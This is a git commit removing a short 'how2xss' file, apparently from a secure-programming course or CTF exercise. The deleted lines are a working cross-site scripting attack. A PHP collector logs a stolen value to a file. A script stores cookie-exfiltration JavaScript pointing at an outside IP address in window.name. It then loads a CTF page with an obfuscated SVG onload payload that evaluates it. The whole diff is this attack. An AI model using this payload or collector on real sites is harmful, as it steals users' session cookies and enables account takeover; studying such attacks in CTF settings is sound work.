fede20d602686815ecf7e44b2cccf4d22e57ef98
HarworkingSnowman <cpr1014@gmail.com>
2019-11-09 11:44:35 +0800

    remove how2xss

--- WEB/SecureProgramming/how2xss/test.php
+++
@@ -1,9 +0,0 @@
-<?php
-$f = fopen("res.txt", "w");
-fwrite($f, $_GET['flag']);
-?>
-
-<script>
-    window.name="window.location.href='http://140.113.68.171:8000/test.php?flag='+document.cookie";
-    window.location="https://edu-ctf.kaibro.tw:30678/hackme.php?q=%3CSVG/ONLoAD=eval(n%26%2397;m\\u{65})%3E";
-</script>
